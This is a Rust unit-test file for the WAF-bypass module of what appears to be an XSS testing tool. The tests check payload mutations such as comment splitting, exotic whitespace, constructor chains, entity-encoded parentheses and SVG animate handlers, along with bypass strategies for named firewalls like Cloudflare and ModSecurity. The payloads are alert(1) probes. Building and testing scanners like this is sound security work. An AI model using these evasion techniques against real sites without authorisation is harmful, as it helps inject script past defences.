use super::*;

#[test]
fn test_html_comment_split() {
    assert_eq!(
        html_comment_split("<script>alert(1)</script>"),
        "<scr<!---->ipt>alert(1)</script>"
    );
    assert_eq!(
        html_comment_split("<img src=x onerror=alert(1)>"),
        "<im<!---->g src=x onerror=alert(1)>"
    );
}

#[test]
fn test_whitespace_mutation() {
    assert_eq!(
        whitespace_mutation("<img src=x onerror=alert(1)>"),
        "<img\tsrc=x onerror=alert(1)>"
    );
    assert_eq!(
        whitespace_mutation("<svg onload=alert(1)>"),
        "<svg\nonload=alert(1)>"
    );
}

#[test]
fn test_js_comment_split() {
    assert_eq!(js_comment_split("alert(1)"), "al/**/ert(1)");
    assert_eq!(js_comment_split("confirm(1)"), "con/**/firm(1)");
}

#[test]
fn test_backtick_parens() {
    assert_eq!(backtick_parens("alert(1)"), "alert`1`");
    assert_eq!(backtick_parens("confirm(1)"), "confirm`1`");
}

#[test]
fn test_constructor_chain() {
    assert_eq!(
        constructor_chain("alert(1)"),
        "[].constructor.constructor('alert(1)')()"
    );
}

#[test]
fn test_unicode_js_escape() {
    assert_eq!(unicode_js_escape("alert(1)"), "\\u0061lert(1)");
}

#[test]
fn test_mixed_html_entities() {
    let result = mixed_html_entities("<img src=x>");
    assert!(!result.contains('<'));
    assert!(!result.contains('>'));
    assert!(result.contains("&#60;") || result.contains("&#x3c;"));
}

#[test]
fn test_case_alternate() {
    let result = case_alternate("<script>");
    assert!(result.contains('S') || result.contains('C'));
    // Should have mixed case
    assert_ne!(result, "<script>");
    assert_ne!(result, "<SCRIPT>");
}

#[test]
fn test_get_bypass_strategy_cloudflare() {
    let strategy = get_bypass_strategy(&WafType::Cloudflare);
    assert!(!strategy.extra_encoders.is_empty());
    assert!(!strategy.mutations.is_empty());
    assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
}

#[test]
fn test_merge_strategies() {
    let waf_types = vec![&WafType::Cloudflare, &WafType::ModSecurity];
    let merged = merge_strategies(&waf_types);
    // Should contain encoders from both
    assert!(merged.extra_encoders.contains(&"unicode".to_string()));
    assert!(merged.extra_encoders.contains(&"4url".to_string()));
    // No duplicates
    let mut seen = std::collections::HashSet::new();
    assert!(merged.extra_encoders.iter().all(|e| seen.insert(e)));
}

#[test]
fn test_apply_mutations_limit() {
    let payloads = vec!["<script>alert(1)</script>".to_string()];
    let mutations = vec![
        MutationType::HtmlCommentSplit,
        MutationType::CaseAlternation,
        MutationType::BacktickParens,
        MutationType::JsCommentSplit,
    ];
    // Limit to 2 variants per payload
    let result = apply_mutations(&payloads, &mutations, 2);
    // Original + at most 2 variants
    assert!(result.len() <= 3);
    assert_eq!(result[0], "<script>alert(1)</script>");
}

#[test]
fn test_apply_mutations_dedup() {
    let payloads = vec!["no_match_here".to_string()];
    let mutations = vec![MutationType::HtmlCommentSplit, MutationType::BacktickParens];
    let result = apply_mutations(&payloads, &mutations, 5);
    // No mutation matched, so just the original
    assert_eq!(result.len(), 1);
}

#[test]
fn test_every_waf_has_strategy() {
    let waf_types = vec![
        WafType::Cloudflare,
        WafType::AwsWaf,
        WafType::Akamai,
        WafType::Imperva,
        WafType::ModSecurity,
        WafType::OwaspCrs,
        WafType::Sucuri,
        WafType::F5BigIp,
        WafType::Barracuda,
        WafType::FortiWeb,
        WafType::AzureWaf,
        WafType::CloudArmor,
        WafType::Fastly,
        WafType::Wordfence,
        WafType::Unknown("test".to_string()),
    ];
    for waf in &waf_types {
        let strategy = get_bypass_strategy(waf);
        assert!(
            !strategy.extra_encoders.is_empty(),
            "WAF {:?} has no extra encoders",
            waf
        );
        assert!(
            !strategy.mutations.is_empty(),
            "WAF {:?} has no mutations",
            waf
        );
    }
}

#[test]
fn test_owasp_crs_strategy() {
    let strategy = get_bypass_strategy(&WafType::OwaspCrs);
    // CRS strategy should include all CRS-targeting mutations
    assert!(strategy.mutations.contains(&MutationType::SlashSeparator));
    assert!(strategy.mutations.contains(&MutationType::SvgAnimateExec));
    assert!(strategy.mutations.contains(&MutationType::HtmlEntityParens));
    assert!(strategy.mutations.contains(&MutationType::ExoticWhitespace));
    // Should include unicode and multi-url encoding
    assert!(strategy.extra_encoders.contains(&"unicode".to_string()));
    assert!(strategy.extra_encoders.contains(&"4url".to_string()));
}

#[test]
fn test_slash_separator() {
    assert_eq!(
        slash_separator("<svg onload=alert(1)>"),
        "<svg/onload=alert(1)>"
    );
    assert_eq!(
        slash_separator("<img src=x onerror=alert(1)>"),
        "<img/src=x onerror=alert(1)>"
    );
}

#[test]
fn test_html_entity_parens() {
    assert_eq!(html_entity_parens("alert(1)"), "alert&#40;1&#41;");
    assert_eq!(
        html_entity_parens("<img src=x onerror=alert(1)>"),
        "<img src=x onerror=alert&#40;1&#41;>"
    );
}

#[test]
fn test_svg_animate_exec() {
    let result = svg_animate_exec("<svg onload=alert(1)>");
    assert!(result.contains("<svg><animate"));
    assert!(result.contains("onbegin=alert(1)"));
    assert!(result.contains("attributeName=x"));
}

#[test]
fn test_svg_animate_exec_from_img() {
    let result = svg_animate_exec("<img src=x onerror=alert(1)>");
    assert!(result.contains("<svg><animate"));
    assert!(result.contains("onbegin=alert(1)"));
}

#[test]
fn test_exotic_whitespace() {
    let result = exotic_whitespace("<img src=x onerror=alert(1)>");
    assert!(result.contains('\x0B') || result.contains('\x0C'));
    assert!(!result.contains("<img src"));
}

#[test]
fn test_exotic_whitespace_svg() {
    let result = exotic_whitespace("<svg onload=alert(1)>");
    assert!(result.contains('\x0B') || result.contains('\x0C'));
}
